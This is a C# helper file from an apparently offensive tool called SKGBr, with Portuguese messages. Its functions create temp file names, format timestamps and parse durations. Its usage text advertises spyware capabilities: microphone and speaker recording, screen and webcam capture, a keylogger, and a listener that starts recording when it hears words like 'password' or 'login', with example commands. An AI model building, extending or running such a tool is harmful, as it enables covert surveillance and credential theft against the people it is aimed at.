using System;
using System.IO;

namespace SKGBr
{
    class Helpers
    {
        public static string CreateTempFileName(string extension = "")
        {
            string result = Path.GetTempPath() + Guid.NewGuid().ToString() + extension;
            return result;
        }

        public static string CurrentTime()
        {
            DateTime dt = DateTime.Now;
            string fmt = "[{0}/{1}/{2}] {3}:{4}:{5}";
            return String.Format(fmt, dt.Month, dt.Day, dt.Year, dt.Hour, dt.Minute, dt.Second);
        }

        public static int ParseTimerString(string str)
        {
            char measure = str[str.Length - 1];
            int time = int.Parse(str.Substring(0, str.Length - 1));
            switch (measure)
            {
                case 's':
                    time *= 1000;
                    break;
                case 'm':
                    time *= (60 * 1000);
                    break;
                case 'h':
                    time *= (60 * 60 * 1000);
                    break;
                default:
                    throw new Exception("Passou medida de tempo inválida. Esperado um de s, m ou h. Recebido: " + measure.ToString());
            }
            return time;
        }

        public static void Usage()
        {
            string usageString = @"
SKGBr.exe [arguments]

Os argumentos podem ser um (e apenas um) dos seguintes:
    gravar_mic [10s]     - Grave áudio do microfone conectado (line-in).
                           O sufixo de tempo pode ser s/m/h.
    
    gravar_sys [10s]     - Gravar áudio dos alto-falantes do sistema (line-out).
                           O sufixo de tempo pode ser s/m/h.

    gravar_audio [10s]   - Grave áudio do microfone e dos alto-falantes.
                           O sufixo de tempo pode ser s/m/h.
    
    captura_tela       - Captura de tela da tela do usuário atual.

    captura_webcam       - Capture imagens da webcam conectada do usuário (se existir).

    captura_teclas   - Comece registrando as teclas digitadas em um arquivo.

    escuta_senhas [keyword1,keyword2,keyword3] - Escuta as palavras 'username', 'password', 'login',
                                                        'logon', e 'credential' por padrão e quando
                                                        ouviu, inicia uma gravação de áudio por dois minutos.

Exemplos:    
    Grave todo o áudio por 30 minutos:
        SKGBr.exe gravar_audio 30m

    Iniciar o keylogger:
        SKGBr.exe captura_teclas

    Inicie o ouvinte de palavras-chave (para um conjunto personalizado de strings):
        SKGBr.exe escuta_senhas oil,password,email
";
            Console.WriteLine(usageString);
        }
    }
}
